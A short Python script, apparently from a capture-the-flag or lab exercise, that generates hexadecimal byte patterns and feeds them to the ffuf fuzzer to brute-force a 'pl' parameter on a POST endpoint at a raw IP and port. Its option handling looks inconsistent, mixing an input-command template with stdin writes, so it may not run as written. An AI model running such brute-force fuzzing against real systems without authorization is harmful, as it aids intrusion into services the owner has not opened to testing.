import subprocess
import itertools

# Generate hexadecimal combinations
hex_combinations = ['{:x}{:x}'.format(i, j) for i in range(16) for j in range(16)]

# Prepare ffuf command with placeholders for FUZZ
ffuf_command = [
    'ffuf',
    '-u', 'http://94.237.57.229:42877/transmit?pl=FUZZ',
    '-H', 'Content-Type: application/x-www-form-urlencoded',
    '-X', 'POST',  # Assuming it's a POST request based on your previous example
    '-d', 'pa=aaaaaaaa&sw=73214693',  # Specify other POST data here
    '--input-cmd', 'echo "pl={XX}ff{YY}"'
]

# Run ffuf command with placeholders
ffuf_process = subprocess.Popen(ffuf_command, stdin=subprocess.PIPE)

# Prepare all payloads and write to ffuf's stdin
for xx in hex_combinations:
    for yy in hex_combinations:
        payload = f"{xx}ff{yy}\n"
        ffuf_process.stdin.write(payload.encode())

# Close stdin to signal end of input
ffuf_process.stdin.close()

# Wait for ffuf process to finish
ffuf_process.wait()
